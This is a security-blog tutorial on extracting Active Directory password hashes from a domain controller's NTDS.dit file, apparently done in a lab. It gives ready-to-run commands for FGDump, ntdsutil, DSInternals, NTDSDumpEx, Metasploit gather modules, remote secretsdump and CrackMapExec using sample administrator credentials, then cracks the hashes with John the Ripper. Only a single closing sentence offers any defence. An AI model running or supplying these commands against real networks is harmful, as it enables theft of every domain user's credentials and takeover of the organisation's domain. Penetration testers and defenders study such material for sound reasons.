<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/credential-dumping/" rel="category tag">Credential Dumping</a>, <a href="https://www.hackingarticles.in/category/red-teaming/domain-credential/" rel="category tag">Domain Credential</a></span>            </div>
            <h1 class="post-title entry-title">Credential Dumping: NTDS.dit</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/credential-dumping-ntds-dit/" rel="bookmark"><time class="entry-date published" datetime="2020-04-13T18:53:49+00:00">April 13, 2020</time><time class="updated" datetime="2025-06-16T11:44:16+00:00">June 16, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, you will learn how Windows Server stores passwords in the <strong data-start="150" data-end="162">NTDS.dit</strong> file and then how to dump these credential hashes from this file.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;"><strong>Introduction to NTDS</strong></span>
<ul>
<li class="ai-optimize-9"><span style="color: #000000;">NTDS Partitions</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Database Storage Table</span></li>
</ul>
</li>
<li class="ai-optimize-11"><span style="color: #000000;"><strong>Extracting Credential by Exploit NTDS.dit in Multiple Methods</strong></span>
<ul>
<li class="ai-optimize-12"><span style="color: #000000;"><strong>FGDump</strong></span></li>
<li class="ai-optimize-13"><span style="color: #000000;"><strong>NTDSUtil</strong></span></li>
<li class="ai-optimize-14"><span style="color: #000000;"><strong>DSInternals</strong></span></li>
<li class="ai-optimize-15"><span style="color: #000000;"><strong>NTDSDumpEx</strong></span></li>
<li class="ai-optimize-16"><span style="color: #000000;"><strong>Metasploit </strong></span>
<ul>
<li class="ai-optimize-17"><span style="color: #000000;">NTDS_location</span></li>
<li class="ai-optimize-18"><span style="color: #000000;">NTDS_grabber</span></li>
<li class="ai-optimize-19"><span style="color: #000000;">secretsdump</span></li>
</ul>
</li>
<li class="ai-optimize-20"><span style="color: #000000;"><strong>CrackMapExec</strong></span></li>
<li class="ai-optimize-21"><span style="color: #000000;"><strong>Cracking Hashes</strong></span></li>
</ul>
</li>
</ul>
<h3 class="ai-optimize-22"><span style="color: #800000;">Introduction to NTDS</span></h3>
<p class="ai-optimize-23"><span style="color: #000000;"><span data-start="246" data-end="254">NTDS</span> stands for <strong data-start="266" data-end="305">New Technologies Directory Services</strong>, and <strong data-start="311" data-end="318">DIT</strong> stands for <strong data-start="330" data-end="360">Directory Information Tree</strong>. You can find the <strong data-start="379" data-end="391">NTDS.dit</strong> file at <strong data-start="400" data-end="419">C:\Windows\NTDS</strong>. This file is a database for Active Directory, storing all its data, including credentials. The default size of <strong data-start="537" data-end="549">NTDS.dit</strong> is 12 MB, but it can extend up to 16TB.</span></p>
<p class="ai-optimize-24"><span style="color: #000000;">Moreover, the Active Directory database is stored in a single <strong data-start="656" data-end="668">NTDS.dit</strong> file, which is logically divided into the following partitions:</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-2_tSC5nogk0/XpSxqtp4jrI/AAAAAAAAji8/sQ4_RPhV7PQXyha2v9vV9bDU7TYneRgKwCLcBGAsYHQ/s1600/0.png"/></p>
<ul>
<li class="ai-optimize-25"><span style="color: #000000;">The Schema Partition contains all the necessary information about objects, their attributes, and their relationships.</span></li>
<li class="ai-optimize-26"><span style="color: #000000;">The Configuration Partition holds details about the forest and trees, which replicate to all domain controllers.</span></li>
<li class="ai-optimize-27"><span style="color: #000000;">The Domain Partition stores all domain-related information.</span></li>
<li class="ai-optimize-28"><span style="color: #000000;">Finally, the Application Partition includes all the details related to any applications within the Active Directory.</span></li>
</ul>
<p class="ai-optimize-29" data-start="1177" data-end="1459"><span style="color: #000000;">From another perspective, you can also categorize the data in <strong data-start="1239" data-end="1247">NTDS</strong> into two main tables: the <strong data-start="1274" data-end="1288">Link Table</strong> and the <strong data-start="1297" data-end="1311">Data Table</strong>. The <strong data-start="1317" data-end="1331">Link Table</strong> contains attributes that refer to objects, while the <strong data-start="1385" data-end="1399">Data Table</strong> includes all the data related to users, groups, and more.</span></p>
<p class="ai-optimize-30" data-start="1461" data-end="1699"><span style="color: #000000;">Finally, to ensure you can crack all the extracted hashes, you should select one and extract it using <strong data-start="1563" data-end="1582">John the Ripper</strong>. Remember to specify the hash format as <strong data-start="1623" data-end="1629">NT</strong>, allowing <strong data-start="1640" data-end="1659">John the Ripper</strong> to crack the password within seconds.</span></p>
<p class="ai-optimize-31"><span style="color: #000000;">The physical structure of NTDS has the following components.</span></p>
<h4 class="ai-optimize-32"><span style="color: #000000;"><u>Data Store Physical Structure Components</u></span></h4>
<p><img decoding="async" src="https://1.bp.blogspot.com/-V3sIow_Lvao/XpSvSqUnHmI/AAAAAAAAjhs/thTVosu1zyU_9d3SSgx6kMX6un8e12PRQCLcBGAsYHQ/s1600/1.1.png"/></p>
<p class="ai-optimize-33"><span style="color: #000000;">Now that we have an idea about the NTDS, it is time to extract some of those precious hashes from the Server. We have the Windows Server with Active Directory setup in our lab environment for the following practical.</span></p>
<h3 class="ai-optimize-34"><span style="color: #800000;">Extracting Credential by Exploit NTDS.dit in Multiple Methods</span></h3>
<h4 class="ai-optimize-35"><span style="color: #800000;">FGDump</span></h4>
<p class="ai-optimize-36"><span style="color: #000000;">FGDump is a tool that was created for mass password auditing of Windows Systems. This means that if an attacker can use the FGDump to extract the password from the target machine. For these purposes, we will need to download the FGDump from this <strong><a style="color: #000000;" href="https://github.com/interference-security/kali-windows-binaries/tree/master/fgdump">link</a></strong>.</span></p>
<p class="ai-optimize-37"><span style="color: #000000;">We fire up the windows command prompt and traverse to the path where we have downloaded the FGDump. In this case, it is in the Downloads Directory. As we have an executable for the FGDump, we ran it directly from the command prompt. </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">fgdump.exe</pre>
<p class="ai-optimize-38"><span style="color: #000000;">As no parameters were provided, FGDump by default did a local dump. After auditing the local passwords, FGDump dumped Password and Cache successfully. Now let’s take a look at the dumped data.</span></p>
<p class="ai-optimize-39"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-dw2pO6az0Ek/XpSvVTffcPI/AAAAAAAAjiM/9MlGmezRYv8kmOiZ38-rrNlCOEEkGXc1QCLcBGAsYHQ/s1600/3.png"/></strong></span></p>
<p class="ai-optimize-40"><span style="color: #000000;">FGDump creates a file with the extension <strong data-start="108" data-end="118">PWDump</strong>. Additionally, it dumps hashes into that file. Furthermore, the name of the server is used as the name of the <strong data-start="229" data-end="239">PWDump</strong> file. You can then read the data in the file using the <strong data-start="295" data-end="303">type</strong> command. As shown in the image below, FGDump has successfully dumped hashes from the target System.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">type &lt;pwdump file name&gt;</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-7W_ieYsKS2Q/XpSvVXuBpiI/AAAAAAAAjiI/RmYHd4qoGWYIaMMNu9AUgxFh6JZ2Nmh5gCLcBGAsYHQ/s1600/4.png"/></p>
<h3 class="ai-optimize-41"><span style="color: #000000;"><span style="color: #800000;">Powershell: NTDSUtil</span> </span></h3>
<p class="ai-optimize-42"><span style="color: #000000;">Enough with the Windows Command prompt, it’s time to move on to PowerShell. We are going to use another executable called NTDSutil.exe. We launch an instance of PowerShell. Then we run NTDSutil.exe with a bunch of parameters instructing it to make a directory called temp in the C:\ drive and asks NTDSUtil to use its ability to tap into the Active Directory Database and fetch the SYSTEM and SECURITY hive files as well as the ntds.dit file. After working for a while, we have the hive files in the temp directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-igMlQRlIFXY/XpSvV9BNA0I/AAAAAAAAjiQ/3Gmg7N-LDpcr1iKxR2IydUxOviAHU9hRACLcBGAsYHQ/s1600/5.png"/></p>
<p class="ai-optimize-43"><span style="color: #000000;">We transfer the hive files onto our Kali Linux Machine to extract hashes from them. We will be using the <strong>secretsdump.py</strong> file from the impacket toolkit to extract hashes. All we need is to provide the path of the SYSTEM hive file and the NTDS.dit file, and we are good to go. We see that in a matter of seconds, secretsdump extracts hashes for us.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-4JbyavtA4UE/XpSvWqbj-CI/AAAAAAAAjiU/3Eb3CpFl13wkgPlBUUIQdEXKqRD0WNGbACLcBGAsYHQ/s1600/6.png"/></p>
<h3 class="ai-optimize-44"><span style="color: #800000;">DSInternals</span></h3>
<p class="ai-optimize-45"><span style="color: #000000;">DSInternals is a framework designed by Michael Grafnetter for performing AD Security Audits. It is a part of the PowerShell official Gallery. This means we can download it by using the <strong>cmdlet Save-Module</strong>. After downloading we need to install the module before using it. This can be done using the <strong>cmdlet Install-Module</strong>. This will require a change in the Execution Policy. After installing the Modules, we are good to go.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;">We first use the Get-Bootkey cmdlet to extract the bootkey from the System Hive. After obtaining the bootkey, we will use it to read the data of one or more accounts form the NTDIS file including the secret attributes like hashes using the Get-ADBAccount cmdlet.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Save-Module DSInternals -Path C:\Windows\System32\WindowsPowershell\v1.0\Modules
Set-ExecutionPolicy Unrestricted
Import-Module DSInternals
Get-BootKey -SystemHivePath 'C:\SYSTEM'
Get-ADDBAccount -All -DBPath 'C:\ntds.dit' -Bootkey &lt;bootkey value&gt;</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-XpiY4-m8j5A/XpSvWgWycxI/AAAAAAAAjiY/iDC3t5WMzCM4MXU4RglotZ0N0vDQAQBoACLcBGAsYHQ/s1600/7.png"/></p>
<p class="ai-optimize-47"><span style="color: #000000;">The Get-ADBAccount cmdlet creates a long sequence of output. Here we are showing you the data of one of the users of the Target Machine. We can see that we have successfully extracted the NTLM hashes from the NTDS.dit file.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-KxBB27XV6NE/XpSvW62mShI/AAAAAAAAjic/ayRRgX2KWCITHt7eGMpd9wUcZmsEHBhpwCLcBGAsYHQ/s1600/8.png"/></p>
<h3 class="ai-optimize-48"><span style="color: #800000;">NTDSDump.exe</span></h3>
<p class="ai-optimize-49"><span style="color: #000000;">Now it’s time to use some external tools for attacking the NTDIS file. We will be using the NTDSDumpEx for this particular Practical. You can download it from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/zcgonvh/NTDSDumpEx/releases">here</a></strong>.</span> We unzip the contents of the compressed file we downloaded and then use the executable file to attack the NTDS file. We will need to provide the path for the ntds.dit file and the System Hive file. In no time the NTDSDumpEx gives us a list of the users with their respective hashes.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">NTDSDumpEx.exe -d C:\ntds.dit -s C:\SYSTEM</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-LIxzQUF7A70/XpSvX65SNDI/AAAAAAAAjig/h7PyE9BIk2Y2CWzdBM-tA2RN-rWHKlYSQCLcBGAsYHQ/s1600/9.png"/></p>
<h3 class="ai-optimize-50"><span style="color: #800000;">Remote: Metasploit (NTDS_location)</span></h3>
<p class="ai-optimize-51"><span style="color: #000000;">For all the Metasploit fans, there is no need to get depressed. Metasploit can work just fine in extracting hashes from the NTDS.dit file. We have 2 exploits that can work side by side to target NTDS. The first one locates the ntds file. We need a session on the Target System to move forward. After we gain a session, we choose the NTDS_location exploit and set the session identifier to the exploit. Upon running the exploit, we see that we have the location of the NTDS.dit file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/gather/ntds_location
set session 1
exploit</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-GxxGI4a9mk8/XpSvSqdCfeI/AAAAAAAAjhw/MdGWG3MuCHoFfY4rLNSNYm96n2I1-zUHQCLcBGAsYHQ/s1600/14.png"/></p>
<h3 class="ai-optimize-52"><span style="color: #800000;">Metasploit (NTDS_grabber)</span></h3>
<p class="ai-optimize-53"><span style="color: #000000;">Moving on, we use another exploit that can extract the NTDS.dit file, SAM and SYSTEM hive files from the Target System. The catch is, it transfers these files in .cab compressed files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/gather/ntds_grabber
set session 1
exploit</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-hVHZaY4wzCo/XpSvTQjrfCI/AAAAAAAAjh0/QnhnVFnGtyczUI4pUf3NsVh0Lm7hykc1wCLcBGAsYHQ/s1600/15.png"/></p>
<p class="ai-optimize-54"><span style="color: #000000;">The exploit works and transfers the cab file to a location that can be seen in the image. Now to extract the NTDS.dit and other hive files, we are going to use a tool called cabextract. This will extract all 3 files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cabextract &lt;cab filename&gt;</pre>
<p class="ai-optimize-55"><span style="color: #000000;">Now that we have the NTDS and the hive files at our disposal, we can use the impacket’s secretsdump script to extract hashes from it as we did earlier.</span></p>
<p class="ai-optimize-56"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-WCiN47x2Ers/XpSvTmVAqZI/AAAAAAAAjh4/rpPS-12EfHcK8Ko2q5hJNyRyRCc1gIG2wCLcBGAsYHQ/s1600/16.png"/></strong></span></p>
<h3 class="ai-optimize-57"><span style="color: #800000;">Remote: Metasploit (secretsdump)</span></h3>
<p class="ai-optimize-58"><span style="color: #000000;">Suppose a scenario where we were able to procure the login credentials of the server by any method but it is not possible to access the server directly, we can use this exploit in the Metasploit framework to extract the hashes from the NTDS.dit file remotely. We will use this auxiliary to grab the hashes. We need to provide the IP Address of the Target Machine, Username and Password. The auxiliary will grab the hashes and display it on our screen in a few seconds.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/smb/impacket/secretsdump
set rhosts 192.168.1.108
set smbuser administrator
set smbpass Ignite@987
exploit</pre>
<pre class="lang:default decode:true"><img decoding="async" src="https://1.bp.blogspot.com/-74iSUge_mbM/XpSvUZ-UAII/AAAAAAAAjh8/ma3bB3HxlsE3DFtCcPC6f2FTHF0wrVLMwCLcBGAsYHQ/s1600/17.png"/></pre>
<h3 class="ai-optimize-59"><span style="color: #800000;">CrackMapExec</span></h3>
<p class="ai-optimize-60"><span style="color: #000000;">CrackMapExec is a really sleek tool that can be installed with a simple apt install and it runs very swiftly. This tool acts as a database for Active Directory and stores all its data including all the credentials and so we will manipulate this file to dump the hashes as discussed previously. It requires a bunch of things.</span></p>
<p class="ai-optimize-61"><span style="color: #000000;"><strong>Requirements:</strong></span></p>
<p class="ai-optimize-62"><span style="color: #000000;"><strong>Username:</strong> Administrator</span></p>
<p class="ai-optimize-63"><span style="color: #000000;"><strong>Password:</strong> Ignite@987</span></p>
<p class="ai-optimize-64"><span style="color: #000000;"><strong>IP Address:</strong> 192.168.1.105</span></p>
<p class="ai-optimize-65"><span style="color: #000000;"><strong>Syntax: crackmapexec smb [IP Address] -u ‘[Username]’ -p ‘[Password]’ -ntds drsuapi<br/>
</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --ntds drsuapi</pre>
<p class="ai-optimize-66"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8VJhHacT6KY/XrQGrh2dz-I/AAAAAAAAj6s/u5Nv-eJ2Ri0cMHA1FKRU_JzTgPPM54Y2ACLcBGAsYHQ/s1600/17.png" border="0" data-original-height="263" data-original-width="1210"/></span></p>
<p class="ai-optimize-67"><span style="color: #000000;"><strong>Read More: </strong></span><strong><a href="https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/">Lateral Moment on Active Directory: CrackMapExec</a></strong></p>
<h3 class="ai-optimize-68"><span style="color: #800000;">Hash Cracking</span></h3>
<p class="ai-optimize-69"><span style="color: #000000;">To ensure that all the hashes that we extracted can be cracked, we decided to take one and extract it using John the Ripper. We need to provide the format of the hash, which is NT. John the Ripper will crack the password in a matter of seconds.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat hash
john --format=NT hash --show</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Tsin9D68lmk/XpSvU58RtXI/AAAAAAAAjiE/8xfS_nzUAVseD05rfS64YagdCquI6cD3QCLcBGAsYHQ/s1600/19.png"/></p>
<p class="ai-optimize-70"><span style="color: #000000;">This concludes the various methods in which can extract the hashes that are stored in the Windows Server. We included multiple tools to cover the various scenarios that an attacker can face. And the only way to protect yourself against such attacks is to minimise the users who can access Domain Controllers. Continuously, log and monitor the activity for any changes. It is frequently recertified.</span></p>
<p class="ai-optimize-71"><strong><span style="color: #000000;">Reference: <a style="color: #000000;" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772829(v=ws.10)?redirectedfrom=MSDN#w2k3tr_adstr_how_jddq">How the Data Store Works</a></span></strong></p>
<p class="ai-optimize-72"><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
